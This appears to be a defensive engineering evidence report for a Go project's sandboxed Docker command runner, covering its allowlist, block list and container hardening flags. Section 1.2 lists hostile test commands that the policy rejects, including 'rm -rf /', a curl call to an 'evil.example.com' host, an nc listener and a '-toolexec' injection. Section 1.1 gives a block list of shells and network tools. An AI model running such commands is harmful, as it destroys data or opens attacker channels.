# M3.8 Phase 2.1.2 — Container Oracle & Policy Evidence

**Date:** 2026-11-23  
**Repository:** `CV-Code-Vitals/Thermodynamic-Evolution-UCS503`  
**Commit:** `0843ca613c602764ef3f534fc21bed7843486ba0` (with local Phase 2.1.2 stabilization fixes)

---

## 1. Zero-Execution Command Policy Verification

`DockerContainerRunner.RunCommand()` enforces application-level command validation **prior to** checking container availability, incrementing execution counters, or creating containers.

### 1.1 Policy Rules
- **Whitelisted Binary:** Only `go` / `go.exe` is permitted.
- **Whitelisted Subcommands:** Only `vet`, `test`, and `build` are permitted.
- **Blocked Binaries:** All shells (`sh`, `bash`, `zsh`, `cmd`, `powershell`, `pwsh`), interpreters (`python`, `perl`, `ruby`, `node`, `php`), network utilities (`curl`, `wget`, `nc`, `socat`, `ssh`), package managers (`apt`, `apk`, `yum`, `docker`, `sudo`), and destructive binaries (`rm`, `dd`, `del`).
- **Forbidden Flags:** Flag inspection explicitly blocks `-exec`, `--exec`, `-toolexec`, `--toolexec`, `-plugin`, `--plugin`.

### 1.2 Zero Execution Attempt Evidence
Unit test `TestCommandPolicy_ZeroExecutionAttemptsOnForbiddenCommands` evaluated 14 distinct prohibited vectors:
1. `sh -c 'echo pwned'`
2. `bash -c 'whoami'`
3. `powershell.exe -Command 'dir'`
4. `cmd.exe /c 'dir'`
5. `python -c 'import os; print(os.environ)'`
6. `curl -s https://evil.example.com`
7. `wget https://evil.example.com`
8. `nc -lvp 4444`
9. `rm -rf /`
10. `go test -exec 'rm -rf /'`
11. `go test -toolexec '/evil/bin'`
12. `go build -plugin`
13. `go get github.com/evil/pkg`
14. `go run main.go`

**Outcome:** Every vector was rejected with `security violation: command policy rejection`.  
**Execution Counter:** `atomic.LoadInt64(&runner.ExecutionAttempts) == 0`.

---

## 2. Container Isolation Bounds & Telemetry Schema

Every container run populates `ContainerExecutionEvidence` with exhaustive telemetry:

```json
{
  "container_id": "ucs503-oracle-4a8b1c9d2e3f",
  "isolation_policy": "DOCKER_HARDENED_CONTAINER (network=none, read-only-root, tmpfs=/tmp, cap-drop=ALL, no-new-privs, non-root=10001:10001)",
  "command": "go vet ./...",
  "exit_status": 0,
  "memory_limit_mb": 1024,
  "cpu_limit": 2.0,
  "network_policy": "DISABLED (--network none)",
  "root_fs_policy": "READ_ONLY (--read-only)",
  "workspace_dir": "E:/SWE/go-backend/uploads/workspace_test",
  "module_dir": "E:/SWE/go-backend/uploads/workspace_test",
  "image": "ucs503-sandbox-runner:latest",
  "image_digest": "sha256:98e6cffc31ccc44c7c15d83df1d69891efee8115a5bb7ede2bf30a38af3e3c92",
  "timeout_cause": "",
  "required_dependencies": [
    "golang.org/x/sys v0.6.0"
  ],
  "cleanup_result": "SUCCESS: container removed"
}
```

### 2.1 Enforced Flags
| Isolation Dimension | Enforced Container Flag | Security Assurance |
|---|---|---|
| Network | `--network none` | Egress/ingress completely disabled; no SSRF or exfiltration |
| Filesystem Root | `--read-only` | Root filesystem cannot be modified or persisted |
| User Identity | `--user 10001:10001` | Non-root execution; cannot access host resources |
| Capabilities | `--cap-drop ALL` | All Linux capabilities dropped |
| Privilege Escalation | `--security-opt no-new-privileges` | SUID/SGID elevation blocked |
| Temporary Space | `--tmpfs /tmp:rw,exec,nosuid,nodev,mode=1777` | Ephemeral scratch space bounded in RAM |
| Memory Quota | `--memory 1024m` | OOM containment prevents host exhaustion |
| CPU Quota | `--cpus 2.00` | CPU throttling prevents DoS loops |
| Process Quota | `--pids-limit 128` | Fork-bomb mitigation |
| Workspace Mount | `-v <workspace>:/workspace:rw` | Scoped to disposable sandbox directory |
| Module Cache Mount | `-v <cache>:/go/pkg/mod:ro` | Read-only dependency access; no container tampering |
| Environment | `-e GOPROXY=off -e GOSUMDB=off -e CGO_ENABLED=0` | Deterministic offline Go toolchain execution |
